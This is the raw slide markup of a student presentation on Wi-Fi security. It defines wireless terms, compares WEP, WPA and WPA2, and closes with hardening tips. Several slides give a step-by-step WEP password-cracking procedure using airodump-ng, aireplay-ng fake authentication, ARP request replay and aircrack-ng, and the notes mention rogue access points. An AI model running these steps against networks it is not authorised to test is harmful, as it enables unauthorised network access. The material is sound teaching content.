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65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ccee6972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fccee6972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fccee6972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fccee6972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fccee6972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fccee6972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ccee6972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ccee6972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ccee6972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fccee6972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fccee6972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fccee6972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fccee6972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fccee6972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Speak about the wifi card first and then come back to the steps and later add the different attacks that can be done.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Attacks that can be done:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Dos , man in the middle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fccee6972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fccee6972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fccee6972_0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fccee6972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ccee6972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fccee6972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fccee6972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fccee6972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ccee6972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fccee6972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fccee6972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fccee6972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Talk about the waiting time and number of packets to be collected for different standards to crack them.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Talk about key complexity and rainbow tables.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Talk about the files.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fccee6972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fccee6972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ccee6972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fccee6972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ccee6972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fccee6972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Although there is a learning curve to the tools there are semi-automated and we don’t have to continuously monitor the network. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>The usage manuals are given over the net and most of the tools are free to use.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ccee6972_0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fccee6972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1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>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Clr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="●"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2286000" lvl="4" indent="-317500">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2743200" lvl="5" indent="-317500">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="■"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="3200400" lvl="6" indent="-317500">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="●"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3657600" lvl="7" indent="-317500">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="dk1"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="dk1"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="4114800" lvl="8" indent="-317500">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="160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1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1371600" lvl="2" indent="-317500">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="■"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1828800" lvl="3" indent="-317500">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="●"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2286000" lvl="4" indent="-317500">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2743200" lvl="5" indent="-317500">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="■"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="3200400" lvl="6" indent="-317500">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="●"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3657600" lvl="7" indent="-317500">
              <a:lnSpc>
                <a:spcPct val="115000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buClr>
                <a:schemeClr val="lt2"/>
              </a:buClr>
              <a:buSzPts val="1400"/>
              <a:buChar char="○"/>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="lt2"/>
                </a:solidFill>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="4114800" lvl="8" indent="-31750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n"/>
              <a:t>Wireless Networks and Vulnerabilities</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="55" name="Google Shape;55;p13"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4760700" y="3473075"/>
            <a:ext cx="4252500" cy="1572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dirty="0"/>
              <a:t>Sri </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Harsha </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en" smtClean="0"/>
              <a:t>Dokula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Abstract</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To find the vulnerabilities present in wireless networks (mainly in WI-FI) that can pose a risk to privacy or to development of any technology.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>To  find countermeasures that can reduce the risk, need to be practiced for secure designing, deploying and monitoring technologies.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Project Structure</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Understanding wireless networks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Wireless security</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Vulnerabilities and exploiting network</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Securing wireless networks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Understanding wireless networks</a:t>
            </a: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Access point- An access point is a piece of wireless communications hardware that creates a central point of wireless connectivity.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>SSID- A Service Set Identifier is a unique identifier that names particular WLAN. It is used to establish and maintain wireless connectivity.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Wireless modes- In the process of penetration testing, testers use some advanced modes of wireless devices. Monitor and master mode will help in capturing and setting up virtual rogue access points. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="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Understanding wireless networks continued..</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Monitor mode- In this mode the card will not interact with any of the wireless devices around but allows the user to sniff and capture the packets in the network for analysing, decrypting the information.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Master mode- This mode allows the wireless card to behave as a wireless access point. This help in creating a wireless rogue access point for trapping people.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Wireless security</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WEP (wired Equivalent Privacy) - Built or designed with an intention to provide a secure connection with a level of security equivalent to wired connection. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>WPA (wireless protected access) - Uses similar strategy to WEP but more secure, still vulnerable.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>WPA2 - This is a advance version of WPA uses AES encryption it is much more secure than other methods but is still crackable.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Vulnerabilities and Exploiting networks</a:t>
            </a:r>
            <a:endParaRPr/>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Vulnerability -  A “vulnerability” is a mistake in software that can be directly used by a hacker to gain access to a system network.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Exposure - “exposure” is a mistake in software that allows access to information or capabilities that can be used by a hacker as a stepping-stone into a system or network. </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>CVE (Common Vulnerabilities and Exposures) - It is a list of common vulnerabilities and exposure that aim to provide common names for publicly known problem. The MITRE corporation maintains the CVE site and assures that CVE serves the public interest.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="16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Vulnerabilities and Exploiting networks continued..</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="103" name="Google Shape;10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Steps to crack a wireless network password:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Verify the wireless card</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="104" name="Google Shape;104;p21"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1519250" y="2249825"/>
            <a:ext cx="3784325" cy="2532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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="222725" y="361925"/>
            <a:ext cx="8609700" cy="42069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Activate the monitoring mode on the card</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="110" name="Google Shape;110;p22"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1850488" y="1327025"/>
            <a:ext cx="5443025" cy="3688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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="306250" y="285375"/>
            <a:ext cx="8526000" cy="4283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Scan all wifi networks</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Airodump-ng mon0</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="116" name="Google Shape;116;p23"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1776774" y="1322075"/>
            <a:ext cx="5517399" cy="3701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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="306250" y="278400"/>
            <a:ext cx="8526000" cy="4304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Scan and monitor selected network</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>airodump-ng -w wep -c 5-bssid &lt;mac of target&gt; mon0</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="122" name="Google Shape;122;p24"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1844988" y="1302325"/>
            <a:ext cx="5448526" cy="3680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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="306250" y="236650"/>
            <a:ext cx="8526000" cy="4325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Create fake traffic and capture the packets.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>aireplay-ng -1 0 –a &lt;target mac&gt; –h &lt;attacker mac&gt; –e &lt;target ssid&gt; –ignore-negative-one mon0</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="128" name="Google Shape;128;p25"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2023337" y="1513975"/>
            <a:ext cx="5097325" cy="34353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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="292325" y="264475"/>
            <a:ext cx="8540100" cy="430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Now to perform Arp request replay attack use the code </a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>aireplay-ng -3 –b &lt;target mac&gt; –h &lt;attacker mac&gt; –ignore-negative-one mon0.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="134" name="Google Shape;134;p26"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2077785" y="1430323"/>
            <a:ext cx="4988425" cy="3354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body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="306250" y="313200"/>
            <a:ext cx="8526000" cy="42558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Crack for password</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>aircrack-ng wep-01.cap</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="0" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="1600"/>
              </a:spcAft>
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="140" name="Google Shape;140;p27"/>
          <p:cNvPicPr preferRelativeResize="0"/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId3">
            <a:alphaModFix/>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="1792424" y="1321424"/>
            <a:ext cx="5559149" cy="3668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Securing Wireless network</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="146" name="Google Shape;146;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Manually defending wireless networks:</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="1600"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Change the default SSID after WLAN configuration.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Do not set a simple password, use combination of alphabets, numbers and symbols.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Enable MAC filtering on access point or router. That is adding the MAC address of the permitted devices to the access point.</a:t>
            </a:r>
            <a:endParaRPr/>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="0" indent="-342900" rtl="0">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:buSzPts val="1800"/>
              <a:buChar char="●"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en"/>
              <a:t>Stop broadcasting the SSID.</a:t>
            </a:r>
